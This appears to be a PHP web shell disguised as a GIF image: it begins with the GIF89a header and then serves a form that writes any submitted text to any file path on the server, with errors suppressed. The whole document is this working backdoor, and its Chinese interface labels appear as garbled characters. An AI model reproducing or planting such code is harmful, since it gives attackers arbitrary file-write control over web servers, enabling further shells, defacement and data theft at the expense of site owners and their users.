GIF89a  <?php 
header("content-Type: text/html; charset=gb2312"); 
if(get_magic_quotes_gpc()) foreach($_POST as $k=>$v) $_POST[$k] = stripslashes($v); 
?> 
<form method="POST"> 
�����ļ���: <input type="text" name="file" size="60" value="<?php echo str_replace('\\','/',__FILE__) ?>"> 
<br><br> 
<textarea name="text" COLS="70" ROWS="18" ></textarea> 
<br><br> 
<input type="submit" name="submit" value="����"> 
<form> 
<?php 
if(isset($_POST['file'])) 
{ 
$fp = @fopen($_POST['file'],'wb'); 
echo @fwrite($fp,$_POST['text']) ? '����ɹ�!' : '����ʧ��!'; 
@fclose($fp); 
} 
?>
